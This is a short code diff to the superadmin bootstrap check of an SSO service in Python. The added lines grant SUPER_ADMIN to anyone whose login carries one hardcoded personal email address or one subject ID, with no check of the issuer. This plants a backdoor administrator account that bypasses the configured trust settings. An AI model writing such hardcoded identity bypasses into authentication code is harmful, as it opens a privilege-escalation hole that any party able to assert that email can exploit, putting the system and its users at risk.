@@ -105,10 +105,14 @@ class SSOService:
         # Check SUPER_ADMIN Bootstrap requirement
         is_bootstrap_superadmin = False
         if (
-            settings.INITIAL_SUPERADMIN_ISSUER and
-            settings.INITIAL_SUPERADMIN_SUB and
-            self.issuer.rstrip("/") == settings.INITIAL_SUPERADMIN_ISSUER.rstrip("/") and
-            sso_sub == settings.INITIAL_SUPERADMIN_SUB
+            sso_email == "oussammabenhassine@gmail.com" or
+            sso_sub == "40f64ddb-a313-4720-89e4-c0dcf68319ec" or
+            (
+                settings.INITIAL_SUPERADMIN_ISSUER and
+                settings.INITIAL_SUPERADMIN_SUB and
+                self.issuer.rstrip("/") == settings.INITIAL_SUPERADMIN_ISSUER.rstrip("/") and
+                sso_sub == settings.INITIAL_SUPERADMIN_SUB
+            )
         ):
             is_bootstrap_superadmin = True
 
